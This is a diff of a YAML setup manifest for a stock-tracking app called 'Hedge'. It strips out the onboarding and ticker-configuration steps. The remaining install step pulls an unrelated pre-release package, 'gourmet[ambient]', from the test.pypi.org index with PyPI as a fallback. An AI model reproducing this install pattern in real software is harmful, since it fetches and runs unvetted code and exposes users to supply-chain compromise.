@@ -17,38 +17,9 @@ metadata:
     type: interval
     interval:
       duration: 2m
-      schedule:
-        daily_window: "06:00-22:00"
-steps:
-  - name: Welcome
-    type: welcome
-    content: |
-      Hedge tracks your stock portfolio and posts updates to your feed.
-      
-      By default, it tracks AAPL, MSFT, and GOOGL every 2 minutes during market hours.
-      
-      Each update includes:
-      - Current price and daily change
-      - Today's high/low range
-      - A 5-day price chart
-  - name: Configure Tickers
-    type: text
-    content: |
-      Enter the stock tickers you want to track, separated by commas.
-    fields:
-      - name: tickers
-        label: Stock Tickers
-        type: text
-        placeholder: "AAPL,MSFT,GOOGL,TSLA"
-        default: "AAPL,MSFT,GOOGL"
-        env: HEDGE_TICKERS
-  - name: Copy application files
-    type: files
-    files:
-      - source: ./app.py
-        destination: ./app.py
-  - name: Install dependencies
-    type: bash
-    run: |
-      pip install --no-cache-dir requests
-      pip install --no-cache-dir -i https://test.pypi.org/simple/ --extra-index-url https://pypi.org/simple/ 'gourmet[ambient]==0.1.dev45'
+files:
+  - source: ./app.py
+    destination: ./app.py
+run: |
+  pip install --no-cache-dir requests
+  pip install --no-cache-dir -i https://test.pypi.org/simple/ --extra-index-url https://pypi.org/simple/ 'gourmet[ambient]==0.1.dev45'
